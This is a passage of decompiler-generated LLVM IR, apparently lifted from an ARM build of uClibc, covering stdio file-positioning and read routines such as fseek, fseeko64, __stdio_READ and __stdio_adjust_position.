  br label %dec_label_pc_17ee0

dec_label_pc_17e14:                               ; preds = %dec_label_pc_17e04
  %v2_17e14 = add i32 %v1_17dc8, %arg1
  %v2_17e18 = add i32 %tmp, %arg3
  store i32 %v2_17e18, i32* @ip, align 4
  store i32 %v1_17dc8, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17ec8

dec_label_pc_17e34:                               ; preds = %dec_label_pc_17ec8
  %v1_17e34 = add i32 %v0_17e88, 16
  %v2_17e34 = inttoptr i32 %v1_17e34 to i16*
  %v3_17e34 = load i16, i16* %v2_17e34, align 2
  %v4_17e34 = zext i16 %v3_17e34 to i32
  %v1_17e38 = add nuw nsw i32 %v4_17e34, 7
  %v1_17e3c = and i32 %v1_17e38, 131064
  store i32 %v1_17e3c, i32* %r2.global-to-local, align 4
  %v2_17e44 = add i32 %v1_17e3c, %v0_17e90
  store i32 %v2_17e44, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_17e44, %v2_17e18
  br i1 %tmp26, label %dec_label_pc_17e50, label %dec_label_pc_17e84

dec_label_pc_17e50:                               ; preds = %dec_label_pc_17e34
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_17e58 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_17e58, i32* %r2.global-to-local, align 4
  %v0_17e5c = load i32, i32* %sl.global-to-local, align 4
  %v1_17e60 = load i32, i32* @sp, align 4
  %v2_17e60 = inttoptr i32 %v1_17e60 to i32*
  store i32 0, i32* %v2_17e60, align 4
  %v4_17e64 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_17e58, i32 %v0_17e5c)
  %v0_17e68 = load i32, i32* @r5, align 4
  %v1_17e68 = load i32, i32* %r6.global-to-local, align 4
  %v9_17e68 = icmp eq i32 %v0_17e68, %v1_17e68
  br i1 %v9_17e68, label %dec_label_pc_17e70, label %dec_label_pc_17edc

dec_label_pc_17e70:                               ; preds = %dec_label_pc_17e50
  %v0_17e70 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_17e7c = inttoptr i32 %v0_17e70 to i32*
  store i32 22, i32* %v2_17e7c, align 4
  %v0_17ee0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17ee0

dec_label_pc_17e84:                               ; preds = %dec_label_pc_17e34
  %v1_17e84 = inttoptr i32 %v0_17e88 to i32*
  %v2_17e84 = load i32, i32* %v1_17e84, align 4
  %v3_17e84 = add i32 %v0_17e88, 4
  %v4_17e84 = inttoptr i32 %v3_17e84 to i32*
  %v5_17e84 = load i32, i32* %v4_17e84, align 4
  store i32 %v5_17e84, i32* %r4.global-to-local, align 4
  %v1_17e88 = add i32 %v0_17e88, 8
  store i32 %v1_17e88, i32* %sb.global-to-local, align 4
  %v1_17e8c = inttoptr i32 %v1_17e88 to i32*
  %v2_17e8c = load i32, i32* %v1_17e8c, align 4
  store i32 %v2_17e8c, i32* %sb.global-to-local, align 4
  %v3_17e8c = add i32 %v0_17e88, 12
  %v4_17e8c = inttoptr i32 %v3_17e8c to i32*
  %v5_17e8c = load i32, i32* %v4_17e8c, align 4
  store i32 %v5_17e8c, i32* %sl.global-to-local, align 4
  %v1_17e90 = inttoptr i32 %v0_17e90 to i32*
  store i32 %v2_17e84, i32* %v1_17e90, align 4
  %v3_17e90 = add i32 %v0_17e90, 4
  %v4_17e90 = inttoptr i32 %v3_17e90 to i32*
  %v5_17e90 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17e90, i32* %v4_17e90, align 4
  %v0_17e94 = load i32, i32* @r7, align 4
  %v1_17e94 = add i32 %v0_17e94, 8
  %v1_17e98 = inttoptr i32 %v1_17e94 to i32*
  %v2_17e98 = load i32, i32* %v1_17e98, align 4
  %v3_17e98 = add i32 %v0_17e94, 12
  %v4_17e98 = inttoptr i32 %v3_17e98 to i32*
  %v5_17e98 = load i32, i32* %v4_17e98, align 4
  store i32 %v5_17e98, i32* @r4, align 4
  %v1_17e9c = load i32, i32* @r5, align 4
  %v2_17e9c = add i32 %v1_17e9c, 8
  %v3_17e9c = inttoptr i32 %v2_17e9c to i32*
  store i32 %v2_17e98, i32* %v3_17e9c, align 4
  %v0_17ea0 = load i32, i32* @r4, align 4
  %v1_17ea0 = load i32, i32* @r5, align 4
  %v2_17ea0 = add i32 %v1_17ea0, 12
  %v3_17ea0 = inttoptr i32 %v2_17ea0 to i32*
  store i32 %v0_17ea0, i32* %v3_17ea0, align 4
  %v0_17ea4 = load i32, i32* %r2.global-to-local, align 4
  %v1_17ea4 = trunc i32 %v0_17ea4 to i16
  %v2_17ea4 = load i32, i32* @r5, align 4
  %v3_17ea4 = add i32 %v2_17ea4, 16
  %v4_17ea4 = inttoptr i32 %v3_17ea4 to i16*
  store i16 %v1_17ea4, i16* %v4_17ea4, align 2
  %v0_17ea8 = load i32, i32* @r7, align 4
  %v1_17ea8 = add i32 %v0_17ea8, 18
  %v2_17ea8 = inttoptr i32 %v1_17ea8 to i8*
  %v3_17ea8 = load i8, i8* %v2_17ea8, align 1
  %v4_17ea8 = zext i8 %v3_17ea8 to i32
  store i32 %v4_17ea8, i32* @r3, align 4
  %v2_17eac = load i32, i32* @r5, align 4
  %v3_17eac = add i32 %v2_17eac, 18
  %v4_17eac = inttoptr i32 %v3_17eac to i8*
  store i8 %v3_17ea8, i8* %v4_17eac, align 1
  %v0_17eb0 = load i32, i32* @r7, align 4
  %v1_17eb0 = add i32 %v0_17eb0, 16
  %v2_17eb0 = inttoptr i32 %v1_17eb0 to i16*
  %v3_17eb0 = load i16, i16* %v2_17eb0, align 2
  %v4_17eb0 = zext i16 %v3_17eb0 to i32
  %v1_17eb4 = add nsw i32 %v4_17eb0, -19
  store i32 %v1_17eb4, i32* @r2, align 4
  %v0_17eb8 = call i32 @memcpy()
  %v0_17ebc = load i32, i32* @r7, align 4
  %v1_17ebc = add i32 %v0_17ebc, 16
  %v2_17ebc = inttoptr i32 %v1_17ebc to i16*
  %v3_17ebc = load i16, i16* %v2_17ebc, align 2
  %v4_17ebc = zext i16 %v3_17ebc to i32
  %v0_17ec0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_17ec0, i32* @r5, align 4
  %v2_17ec4 = add i32 %v4_17ebc, %v0_17ebc
  store i32 %v2_17ec4, i32* @r7, align 4
  br label %dec_label_pc_17ec8

dec_label_pc_17ec8:                               ; preds = %dec_label_pc_17e14, %dec_label_pc_17e84
  %v0_17e90 = phi i32 [ %tmp, %dec_label_pc_17e14 ], [ %v0_17ec0, %dec_label_pc_17e84 ]
  %v0_17e88 = phi i32 [ %v1_17dc8, %dec_label_pc_17e14 ], [ %v2_17ec4, %dec_label_pc_17e84 ]
  %v3_17ecc = icmp ult i32 %v0_17e88, %v2_17e14
  %v1_17ed0 = add i32 %v0_17e90, 19
  store i32 %v1_17ed0, i32* @r0, align 4
  %v1_17ed4 = add i32 %v0_17e88, 19
  store i32 %v1_17ed4, i32* @r1, align 4
  br i1 %v3_17ecc, label %dec_label_pc_17e34, label %dec_label_pc_17edc.loopexit

dec_label_pc_17edc.loopexit:                      ; preds = %dec_label_pc_17ec8
  %v0_17edc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17edc

dec_label_pc_17edc:                               ; preds = %dec_label_pc_17edc.loopexit, %dec_label_pc_17e50
  %v1_17edc = phi i32 [ %v0_17e90, %dec_label_pc_17edc.loopexit ], [ %v0_17e68, %dec_label_pc_17e50 ]
  %v0_17edc = phi i32 [ %v0_17edc.pre, %dec_label_pc_17edc.loopexit ], [ %v1_17e68, %dec_label_pc_17e50 ]
  %v2_17edc = sub i32 %v1_17edc, %v0_17edc
  store i32 %v2_17edc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17ee0

dec_label_pc_17ee0:                               ; preds = %dec_label_pc_17e70, %dec_label_pc_17e0c, %dec_label_pc_17edc
  %v0_17ee0 = phi i32 [ %v0_17ee0.pre, %dec_label_pc_17e70 ], [ %v0_17e0c, %dec_label_pc_17e0c ], [ %v2_17edc, %dec_label_pc_17edc ]
  store i32 %v3_17db0, i32* %r4.global-to-local, align 4
  store i32 %v6_17db0, i32* @r5, align 4
  store i32 %v12_17db0, i32* @r7, align 4
  ret i32 %v0_17ee0

; uselistorder directives
  uselistorder i32 %v0_17e88, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_17e90, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_17dc8, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 19, { 1, 2, 0, 3 }
  uselistorder i32 18, { 2, 3, 4, 0, 1 }
  uselistorder i32* @sp, { 8, 17, 19, 0, 9, 10, 11, 12, 13, 14, 15, 16, 1, 2, 3, 4, 5, 6, 18, 7 }
  uselistorder i32 14, { 4, 9, 10, 5, 8, 6, 1, 2, 3, 7, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_17ee0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17ec8, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_17efc = load i32, i32* @r1, align 4
  store i32 %v0_17efc, i32* @r2, align 4
  %v0_17f04 = call i32 @__GI_fseeko64()
  ret i32 %v0_17f04
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %v3_17f14 = load i32, i32* @r4, align 4
  %v6_17f14 = load i32, i32* @r5, align 4
  %v12_17f14 = load i32, i32* @r7, align 4
  store i32 %tmp16, i32* @r7, align 4
  %v0_17f28 = load i32, i32* @r2, align 4
  store i32 %v0_17f28, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_26934.581 to i32), i32* %r6.global-to-local, align 4
  %v0_17f34 = load i32, i32* @r0, align 4
  store i32 %v0_17f34, i32* @r5, align 4
  %tmp = icmp ult i32 %tmp16, 3
  br i1 %tmp, label %dec_label_pc_17f50, label %dec_label_pc_17f3c

dec_label_pc_17f3c:                               ; preds = %entry
  %v0_17f3c = call i32 @__GI___errno_location()
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_17f48 = inttoptr i32 %v0_17f3c to i32*
  store i32 22, i32* %v2_17f48, align 4
  br label %dec_label_pc_18040

dec_label_pc_17f50:                               ; preds = %entry
  %v1_17f50 = add i32 %v0_17f34, 52
  %v2_17f50 = inttoptr i32 %v1_17f50 to i32*
  %v3_17f50 = load i32, i32* %v2_17f50, align 4
  %v1_17f54 = sub i32 1, %v3_17f50
  store i32 %v1_17f54, i32* %r8.global-to-local, align 4
  %v2_17f54 = icmp ult i32 %v3_17f50, 2
  br i1 %v2_17f54, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_17f50
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17f9c

bb:                                               ; preds = %dec_label_pc_17f50
  %v2_17f5c = icmp eq i32 %v1_17f54, 0
  br i1 %v2_17f5c, label %dec_label_pc_17f9c, label %dec_label_pc_17f64

dec_label_pc_17f64:                               ; preds = %bb
  %v1_17f68 = add i32 %v0_17f34, 56
  store i32 %v1_17f68, i32* @r4, align 4
  %v4_17f6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 36) to i32*), align 4
  store i32 %v4_17f6c, i32* %r1.global-to-local, align 4
  store i32 %v1_17f68, i32* %r2.global-to-local, align 4
  %v4_17f7c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_17f7c)
  %v0_17f90 = load i32, i32* %r6.global-to-local, align 4
  %v2_17f90 = add i32 %v0_17f90, 16
  %v3_17f90 = inttoptr i32 %v2_17f90 to i32*
  %v4_17f90 = load i32, i32* %v3_17f90, align 4
  store i32 %v4_17f90, i32* @ip, align 4
  store i32 98204, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17f90)
  %v0_17f9c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17f9c

dec_label_pc_17f9c:                               ; preds = %.thread, %bb, %dec_label_pc_17f64
  %v0_17fa8 = phi i32 [ %v0_17f34, %.thread ], [ %v0_17f34, %bb ], [ %v0_17f9c.pre, %dec_label_pc_17f64 ]
  %v1_17f9c = inttoptr i32 %v0_17fa8 to i16*
  %v2_17f9c = load i16, i16* %v1_17f9c, align 2
  %v1_17fa0 = and i16 %v2_17f9c, 64
  %v2_17fa0 = icmp eq i16 %v1_17fa0, 0
  br i1 %v2_17fa0, label %dec_label_pc_17fb8, label %dec_label_pc_17fa8

dec_label_pc_17fa8:                               ; preds = %dec_label_pc_17f9c
  store i32 %v0_17fa8, i32* @r0, align 4
  %v0_17fac = call i32 @__stdio_wcommit()
  %v2_17fb0 = icmp eq i32 %v0_17fac, 0
  br i1 %v2_17fb0, label %dec_label_pc_17fb8, label %dec_label_pc_18020

dec_label_pc_17fb8:                               ; preds = %dec_label_pc_17fa8, %dec_label_pc_17f9c
  %v0_17fb8 = load i32, i32* @r7, align 4
  %v7_17fb8 = icmp eq i32 %v0_17fb8, 1
  br i1 %v7_17fb8, label %dec_label_pc_17fc0, label %dec_label_pc_17fb8.dec_label_pc_17fd4_crit_edge

dec_label_pc_17fb8.dec_label_pc_17fd4_crit_edge:  ; preds = %dec_label_pc_17fb8
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  br label %dec_label_pc_17fd4

dec_label_pc_17fc0:                               ; preds = %dec_label_pc_17fb8
  %v0_17fc0 = load i32, i32* @r5, align 4
  %v2_17fc4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_17fc4, i32* %r1.global-to-local, align 4
  %v2_17fc8 = inttoptr i32 %v0_17fc0 to i16*
  %v3_17fc8 = call i32 @__stdio_adjust_position(i16* %v2_17fc8, i32 %v2_17fc4)
  %v1_17fcc = icmp slt i32 %v3_17fc8, 0
  br i1 %v1_17fcc, label %dec_label_pc_18020, label %dec_label_pc_17fc0.dec_label_pc_17fd4_crit_edge

dec_label_pc_17fc0.dec_label_pc_17fd4_crit_edge:  ; preds = %dec_label_pc_17fc0
  %v0_17fd4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17fd4

dec_label_pc_17fd4:                               ; preds = %dec_label_pc_17fb8.dec_label_pc_17fd4_crit_edge, %dec_label_pc_17fc0.dec_label_pc_17fd4_crit_edge
  %v2_17fdc.pre-phi = phi i32 [ %.pre, %dec_label_pc_17fb8.dec_label_pc_17fd4_crit_edge ], [ %v2_17fc4, %dec_label_pc_17fc0.dec_label_pc_17fd4_crit_edge ]
  %v0_17fd4 = phi i32 [ %v0_17fb8, %dec_label_pc_17fb8.dec_label_pc_17fd4_crit_edge ], [ %v0_17fd4.pre, %dec_label_pc_17fc0.dec_label_pc_17fd4_crit_edge ]
  store i32 %v0_17fd4, i32* %r2.global-to-local, align 4
  %v0_17fd8 = load i32, i32* @r5, align 4
  store i32 %v2_17fdc.pre-phi, i32* %r1.global-to-local, align 4
  %v4_17fe0 = call i32 @__stdio_seek(i32 %v0_17fd8, i32* nonnull %stack_var_-32, i32 %v0_17fd4)
  %v1_17fe4 = icmp slt i32 %v4_17fe0, 0
  br i1 %v1_17fe4, label %dec_label_pc_18020, label %dec_label_pc_17fec

dec_label_pc_17fec:                               ; preds = %dec_label_pc_17fd4
  %v0_17fec = load i32, i32* @r5, align 4
  %v1_17fec = inttoptr i32 %v0_17fec to i16*
  %v2_17fec = load i16, i16* %v1_17fec, align 2
  %v1_17ff0 = add i32 %v0_17fec, 8
  %v2_17ff0 = inttoptr i32 %v1_17ff0 to i32*
  %v3_17ff0 = load i32, i32* %v2_17ff0, align 4
  store i32 %v3_17ff0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_17ff8 = and i16 %v2_17fec, -72
  store i32 0, i32* %r4.global-to-local, align 4
  store i16 %v1_17ff8, i16* %v1_17fec, align 2
  %v0_18004 = load i32, i32* %r2.global-to-local, align 4
  %v1_18004 = load i32, i32* @r5, align 4
  %v2_18004 = add i32 %v1_18004, 28
  %v3_18004 = inttoptr i32 %v2_18004 to i32*
  store i32 %v0_18004, i32* %v3_18004, align 4
  %v0_18008 = load i32, i32* %r1.global-to-local, align 4
  %v1_18008 = trunc i32 %v0_18008 to i8
  %v2_18008 = load i32, i32* @r5, align 4
  %v3_18008 = add i32 %v2_18008, 2
  %v4_18008 = inttoptr i32 %v3_18008 to i8*
  store i8 %v1_18008, i8* %v4_18008, align 1
  %v0_1800c = load i32, i32* %r2.global-to-local, align 4
  %v1_1800c = load i32, i32* @r5, align 4
  %v2_1800c = add i32 %v1_1800c, 16
  %v3_1800c = inttoptr i32 %v2_1800c to i32*
  store i32 %v0_1800c, i32* %v3_1800c, align 4
  %v0_18010 = load i32, i32* %r2.global-to-local, align 4
  %v1_18010 = load i32, i32* @r5, align 4
  %v2_18010 = add i32 %v1_18010, 20
  %v3_18010 = inttoptr i32 %v2_18010 to i32*
  store i32 %v0_18010, i32* %v3_18010, align 4
  %v0_18014 = load i32, i32* %r2.global-to-local, align 4
  %v1_18014 = load i32, i32* @r5, align 4
  %v2_18014 = add i32 %v1_18014, 24
  %v3_18014 = inttoptr i32 %v2_18014 to i32*
  store i32 %v0_18014, i32* %v3_18014, align 4
  %v0_18018 = load i32, i32* %r1.global-to-local, align 4
  %v1_18018 = load i32, i32* @r5, align 4
  %v2_18018 = add i32 %v1_18018, 44
  %v3_18018 = inttoptr i32 %v2_18018 to i32*
  store i32 %v0_18018, i32* %v3_18018, align 4
  br label %dec_label_pc_18024

dec_label_pc_18020:                               ; preds = %dec_label_pc_17fa8, %dec_label_pc_17fd4, %dec_label_pc_17fc0
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18024

dec_label_pc_18024:                               ; preds = %dec_label_pc_17fec, %dec_label_pc_18020
  %v0_18024 = load i32, i32* %r8.global-to-local, align 4
  %v2_18024 = icmp eq i32 %v0_18024, 0
  br i1 %v2_18024, label %dec_label_pc_18024..thread8_crit_edge, label %bb20

dec_label_pc_18024..thread8_crit_edge:            ; preds = %dec_label_pc_18024
  %v0_1803c.pre = load i32, i32* @ip, align 4
  br label %.thread8

bb20:                                             ; preds = %dec_label_pc_18024
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_18034 = load i32, i32* %r6.global-to-local, align 4
  %v3_18034 = add i32 %v1_18034, 24
  %v4_18034 = inttoptr i32 %v3_18034 to i32*
  %v5_18034 = load i32, i32* %v4_18034, align 4
  store i32 %v5_18034, i32* @ip, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_18024..thread8_crit_edge, %bb20
  %v0_1803c = phi i32 [ %v0_1803c.pre, %dec_label_pc_18024..thread8_crit_edge ], [ %v5_18034, %bb20 ]
  %v2_1803c = xor i1 %v2_18024, true
  call void @__pseudo_cond_branch(i1 %v2_1803c, i32 %v0_1803c)
  br label %dec_label_pc_18040

dec_label_pc_18040:                               ; preds = %dec_label_pc_17f3c, %.thread8
  %v0_18040 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v3_17f14, i32* @r4, align 4
  store i32 %v6_17f14, i32* @r5, align 4
  store i32 %v12_17f14, i32* @r7, align 4
  ret i32 %v0_18040

; uselistorder directives
  uselistorder i32 %v0_17fd4, { 1, 0 }
  uselistorder i32 %v3_17f50, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 3, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 76) to i32*), { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 18, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 56, { 12, 14, 5, 6, 7, 8, 13, 4, 1, 0, 3, 15, 10, 16, 11, 9, 2, 17 }
  uselistorder label %dec_label_pc_18040, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_18024, { 1, 0 }
  uselistorder label %dec_label_pc_18020, { 1, 2, 0 }
  uselistorder label %dec_label_pc_17fd4, { 1, 0 }
  uselistorder label %dec_label_pc_17f9c, { 2, 1, 0 }
}

define i32 @function_18054(i32 %arg1) local_unnamed_addr {
dec_label_pc_18054:
  %v0_18054 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18054, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_18054
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18054, %bb
  %v10_18060 = phi i32 [ %arg1, %dec_label_pc_18054 ], [ 0, %bb ]
  ret i32 %v10_18060

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18064 = load i32, i32* @r4, align 4
  store i32 %v3_18064, i32* %stack_var_-12, align 4
  %v0_18068 = load i32, i32* %r0.global-to-local, align 4
  %v1_18068 = inttoptr i32 %v0_18068 to i16*
  %v2_18068 = load i16, i16* %v1_18068, align 2
  %v3_18068 = zext i16 %v2_18068 to i32
  %v1_1806c = and i32 %v3_18068, 4
  store i32 %v1_1806c, i32* %r5.global-to-local, align 4
  %v2_1806c = icmp eq i32 %v1_1806c, 0
  store i32 %v0_18068, i32* %r4.global-to-local, align 4
  br i1 %v2_1806c, label %dec_label_pc_18080, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_18080:                               ; preds = %entry
  %v1_18080 = icmp slt i32 %arg2, 0
  br i1 %v1_18080, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_18080
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_18080, %bb18
  %v1_18088 = add i32 %v0_18068, 4
  %v2_18088 = inttoptr i32 %v1_18088 to i32*
  %v3_18088 = load i32, i32* %v2_18088, align 4
  store i32 %v3_18088, i32* %r0.global-to-local, align 4
  %v1_1808c = call i32 @__GI_read(i32 %v3_18088)
  store i32 %v1_1808c, i32* %r0.global-to-local, align 4
  %v5_18094 = icmp sgt i32 %v1_1808c, 0
  br i1 %v5_18094, label %.thread7, label %dec_label_pc_18098

dec_label_pc_18098:                               ; preds = %bb19
  %v2_18090 = icmp eq i32 %v1_1808c, 0
  %v0_18098 = load i32, i32* %r4.global-to-local, align 4
  %v1_18098 = inttoptr i32 %v0_18098 to i16*
  %v2_18098 = load i16, i16* %v1_18098, align 2
  br i1 %v2_18090, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_18098
  %v2_1809c = or i16 %v2_18098, 4
  store i16 %v2_1809c, i16* %v1_18098, align 2
  %v1_180b8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_18098
  %v2_180a0 = or i16 %v2_18098, 8
  store i16 %v2_180a0, i16* %v1_18098, align 2
  %v1_180ac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_180ac, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_180b8 = phi i32 [ %v1_180b8.pre, %bb20 ], [ 0, %bb ], [ %v1_1808c, %bb19 ], [ %v1_180ac, %bb21 ]
  %v2_180b4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_180b4, i32* @r4, align 4
  ret i32 %v1_180b8

; uselistorder directives
  uselistorder i16 %v2_18098, { 1, 0 }
  uselistorder i32 %v1_1808c, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__GI_read, { 1, 2, 0 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_180bc = load i32, i32* @r4, align 4
  store i32 %v3_180bc, i32* %stack_var_-12, align 4
  %v3_180c0 = load i16, i16* %arg1, align 2
  %v4_180c0 = zext i16 %v3_180c0 to i32
  store i32 %v4_180c0, i32* @ip, align 4
  %tmp17 = urem i16 %v3_180c0, 4
  %v1_180c4 = zext i16 %tmp17 to i32
  store i32 %v1_180c4, i32* %r2.global-to-local, align 4
  %v2_180c4 = icmp eq i16 %tmp17, 0
  br i1 %v2_180c4, label %bb, label %dec_label_pc_180d8

bb:                                               ; preds = %entry
  br label %bb14

dec_label_pc_180d8:                               ; preds = %entry
  %v1_180d8 = add nsw i32 %v1_180c4, -1
  %v7_180d8 = icmp eq i16 %tmp17, 1
  br i1 %v7_180d8, label %bb14, label %dec_label_pc_180e0

dec_label_pc_180e0:                               ; preds = %dec_label_pc_180d8
  %v1_180e0 = and i32 %v4_180c0, 2048
  %v2_180e0 = icmp eq i32 %v1_180e0, 0
  br i1 %v2_180e0, label %bb14, label %dec_label_pc_180e8

dec_label_pc_180e8:                               ; preds = %dec_label_pc_180e0
  %v7_180e8 = icmp eq i32 %v1_180d8, 2
  br i1 %v7_180e8, label %dec_label_pc_1816c, label %dec_label_pc_180f0

dec_label_pc_180f0:                               ; preds = %dec_label_pc_180e8
  %v2_180f0 = add i32 %tmp, 40
  %v3_180f0 = inttoptr i32 %v2_180f0 to i32*
  %v4_180f0 = load i32, i32* %v3_180f0, align 4
  store i32 %v4_180f0, i32* %r3.global-to-local, align 4
  %v2_180f4 = icmp eq i32 %v4_180f0, 0
  br i1 %v2_180f4, label %dec_label_pc_180fc, label %dec_label_pc_1816c

dec_label_pc_180fc:                               ; preds = %dec_label_pc_180f0
  %v2_180fc = add i32 %tmp, 44
  %v3_180fc = inttoptr i32 %v2_180fc to i32*
  %v4_180fc = load i32, i32* %v3_180fc, align 4
  store i32 %v4_180fc, i32* %r3.global-to-local, align 4
  %v2_18100 = add i32 %tmp, 3
  %v3_18100 = inttoptr i32 %v2_18100 to i8*
  %v4_18100 = load i8, i8* %v3_18100, align 1
  %v5_18100 = zext i8 %v4_18100 to i32
  store i32 %v5_18100, i32* %r2.global-to-local, align 4
  %v2_18104 = icmp eq i32 %v4_180fc, 0
  br i1 %v2_18104, label %.thread1, label %bb13

.thread1:                                         ; preds = %dec_label_pc_180fc
  %v1_1810c3 = sub nsw i32 0, %v5_18100
  br label %bb14

bb13:                                             ; preds = %dec_label_pc_180fc
  %v3_18108 = add i32 %tmp, 2
  %v4_18108 = inttoptr i32 %v3_18108 to i8*
  %v5_18108 = load i8, i8* %v4_18108, align 1
  %v6_18108 = zext i8 %v5_18108 to i32
  store i32 %v6_18108, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v6_18108, %v5_18100
  %v3_18110 = sub nsw i32 0, %sum
  br label %bb14

bb14:                                             ; preds = %bb, %.thread1, %dec_label_pc_180d8, %dec_label_pc_180e0, %bb13
  %v1_18124 = phi i32 [ %v1_1810c3, %.thread1 ], [ %v1_180d8, %dec_label_pc_180d8 ], [ 0, %bb ], [ %v1_180d8, %dec_label_pc_180e0 ], [ %v3_18110, %bb13 ]
  %v1_18114 = and i32 %v4_180c0, 64
  %v2_18114 = icmp eq i32 %v1_18114, 0
  %v2_18118 = add i32 %tmp, 16
  %v3_18118 = inttoptr i32 %v2_18118 to i32*
  %v4_18118 = load i32, i32* %v3_18118, align 4
  store i32 %v4_18118, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_18114, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_18124 = sub i32 %v1_18124, %v4_18118
  store i32 %v2_18124, i32* %r3.global-to-local, align 4
  %v1_18128 = inttoptr i32 %arg2 to i32*
  %v2_18128 = load i32, i32* %v1_18128, align 4
  store i32 %v2_18128, i32* %r0.global-to-local, align 4
  %v3_18128 = add i32 %arg2, 4
  %v4_18128 = inttoptr i32 %v3_18128 to i32*
  %v5_18128 = load i32, i32* %v4_18128, align 4
  %v2_1812c = add i32 %storemerge, %v2_18124
  store i32 %v2_1812c, i32* %r4.global-to-local, align 4
  %v2_18130 = sub i32 %v2_18128, %v2_1812c
  store i32 %v2_18130, i32* %r2.global-to-local, align 4
  %v2_18134 = and i32 %v2_1812c, 1073741824
